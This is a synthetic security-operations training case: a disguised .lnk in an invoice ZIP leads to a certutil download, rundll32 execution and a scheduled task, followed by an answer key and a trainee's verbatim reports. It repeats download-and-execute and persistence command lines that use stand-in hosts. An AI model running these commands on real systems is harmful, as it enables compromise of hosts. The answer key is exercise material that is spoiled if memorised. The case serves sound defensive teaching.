# Case 4 — Disguised shortcut, certutil download, scheduled task (W6-C4)

*Synthetic data. Answer key = scenario author's design.*

- **Alert:** EDR "Certutil Used to Download File" (Medium)
- **Host / user:** DEV-PC-11 (developer), user `omar.d`
- **When:** Thursday 11:00–11:40 (background noise: `Code.exe` → `node.exe`/`git.exe`, signed)

## Evidence
| Time | Source | Event |
|---|---|---|
| 11:20:05 | Sysmon 1 | `certutil -hashfile ...\VSCodeUserSetup-x64.exe SHA256`, parent `cmd.exe` ← `WindowsTerminal.exe` — normal |
| 11:29:58 | Sysmon 11 | `chrome.exe` creates `Downloads\Invoice_Oct.zip` (Mark of the Web; referrer `https://docs-share.example.test/view/8841`) |
| 11:30:01 | Sysmon 11 | `explorer.exe` extracts `Invoice_Oct_2026.pdf.lnk` |
| 11:30:09 | Sysmon 1 | `cmd.exe /c certutil -urlcache -split -f http://files-share.example.test/a.dat %TEMP%\a.dat && rundll32.exe %TEMP%\a.dat,Run`, parent `explorer.exe` |
| 11:30:11 | Sysmon 3 | `certutil.exe` → `203.0.113.40:80` |
| 11:30:14 | Sysmon 11 | `certutil.exe` creates `...\Temp\a.dat` |
| 11:30:17 | Sysmon 1 | `rundll32.exe ...\Temp\a.dat,Run`, parent `cmd.exe` |
| 11:30:21 | Sysmon 3 | `rundll32.exe` → `203.0.113.77:8443` (single connection) |
| 11:30:31 | Sysmon 1 + 4698 | `schtasks /create /tn OneDriveHealthCheck /tr "rundll32.exe ...\a.dat,Run" /sc onlogon /f` |

SIEM notes: no AV alert; hashes not checked; no further `rundll32` connections in 24 h; no SMB/lateral activity; `a.dat` content and DNS logs not pulled.

## IOCs (synthetic)
`Invoice_Oct.zip`; `Invoice_Oct_2026.pdf.lnk`; `files-share.example.test/a.dat` (`203.0.113.40`); `%TEMP%\a.dat`; `203.0.113.77:8443`; task `OneDriveHealthCheck`.

## My original verdict
FP, low confidence ("no impact"). **Incorrect.** Resubmitted three fields (verdict, strongest evidence, what would change my mind): TP with the correct chain, but "what would change my mind" was still "nothing" and was flagged.

## What was wrong / corrected
- Merged two different `certutil` uses; the alert was about the second.
- Missed the `.lnk` (explorer extracted and opened it).
- Wrote a command line as the "persistence" and as the process tree; persistence is the single scheduled task.
- "What would change my mind: if the user denies it" points the wrong way.
- Assumed future behavior without evidence; the single outbound connection does not prove C2 or exfiltration.

## Answer key
**TP, high (or medium-to-high) confidence.** Chain: ZIP with MotW → `.lnk` disguised as PDF → cmd → certutil download → rundll32 on a `.dat` → external connection → task re-launching the same file with a masqueraded name.

## Lessons
Same tool, different commands. Do not judge by damage. One scheduled task = one mechanism.

## Original report
*Verbatim as submitted (spelling errors kept). Whitespace normalized; long Base64 strings replaced with a marker. Evidence lines copied from the case are part of what I submitted.*

**First submission**

```
CASE ID:W6-C4
INITIAL ALERT (rule + host + time):EDR «Certutil Used to Download File  host: DEV-PC-11.  User: omar.d.   In time 11:00 morning.
TIMELINE : in 11:00 to 11:40 the code.exe extension node.exe and git.exe   in 11:20:5 the perants cmd.exe  extension certutil.exe by the commend( certutil -hashfile C:\Users\omar.d\Downloads\VSCodeUserSetup-x64.exe SHA256) in 11:29:8 the user open chrome.exe and download Invoice_Oct.zip from https://docs-share.example.test/view/8841 and in 11:30:01 explore the zip file  and created proces by the commend ( cmd.exe /c certutil -urlcache -split -f http://files-share.example.test/a.dat %TEMP%\a.dat && rundll32.exe %TEMP%\a.dat,Run) and this file certutil.exe  connected with the external ip 203.0.113.40:80 and certuril.exe created  file in 11:30:14 in the path C:\Users\omar.d\AppData\Local\Temp\a.dat and 11:30:17 use cmd.exe to do this commend C:\Users\omar.d\AppData\Local\Temp\a.dat and the 11:30:21 rundll32.exe connected with 203.0.113.77:8443, made the a new task in schtasks.exe(parent :rundll32.exe)schtasks /create /tn OneDriveHealthCheck /tr "rundll32.exe C:\Users\omar.d\AppData\Local\Temp\a.dat,Run" /sc onlogon /f
ONE-SENTENCE STORY : the user use certutil.exe to get the hash  (\VSCodeUserSetup-x64.exe) and download some file and create some process and  schtasks and connected with some external ip.
PROCESS TREE / COMMAND LINE:  C:\Users\omar.d\AppData\Local\Temp\a.dat cmd.exe /c certutil -urlcache -split -f http://files-share.example.test/a.dat %TEMP%\a.dat && rundll32.exe %TEMP%\a.dat,Run
PERSISTENCE: cmd.exe /c certutil -urlcache -split -f http://files-share.example.test/a.dat %TEMP%\a.dat && rundll32.exe %TEMP%\a.dat,Run and  schtasks /create /tn OneDriveHealthCheck /tr "rundll32.exe C:\Users\omar.d\AppData\Local\Temp\a.dat,Run" /sc onlogon /f
NETWORK: connected with external ip  203.0.113.40
203.0.113.77
WHAT I KNOW: i know the what ip connected and what file download and what task and process create and the commend and the time for timeline
WHAT I ASSUME: the user have some suspicious actions by he do not any damage the company, we have do more  investigate  and he do in the future.
STRONGEST EVIDENCE : download the   unauthorized  file and cteated Schrader task and connected  external and creates file in the patg %team%
WEAKEST EVIDENCE (and why): use /c and connected with external
MISSING EVIDENCE : the hash
You questions : the first action for certutil.exe he is want the hash for the file and the second he is connected with external ip to create process
WHAT WOULD CHANGE MY MIND :1- if i aske the own user and say he do not do that
VERDICT:FP
CONFIDENCE: low + do not have impact
RECOMMENDED RESPONSE : aske the user owner if he do that and more investigate and Know that the hash for the all file
ENGLISH VERDICT : the host: DEV-PC-11.  User: omar.d. in the time 11:20:00 being the actions to use cmd.exe and use certutil.exe to get hash and download file Invoice_Oct.zip  and created the file وa.dat و.lnk. and connected with the external ip
```

**Resubmission (three fields, after review)**

```
VERDICT : I assess true positive because  the host: DEV-PC-11.  User: omar.d. in the time 11:20:00 being the actions to use cmd.exe(parent) and use certutil.exe(child) to  download  a.dat run in rund1132. And connextion with external ip  and the same use download invice_0ct_2026 used double execution. And  explorer.exe open the file lnk.

2-Strongest : download file double execution Invoice_0ct_2026.pdf.lnk and connection with external ip

3-What would change my mind: we don't have any think to changed my mind because he is download(ملف خبيث ) ماكو اي شيء يكدر يغير مالتي الرئي له انو هذا اختبار او لا شيء اخر لانه تصرف كله خبيث
```

*Note (translated):* I hoped this was better; I did this on the second day because I could not do it the day before.

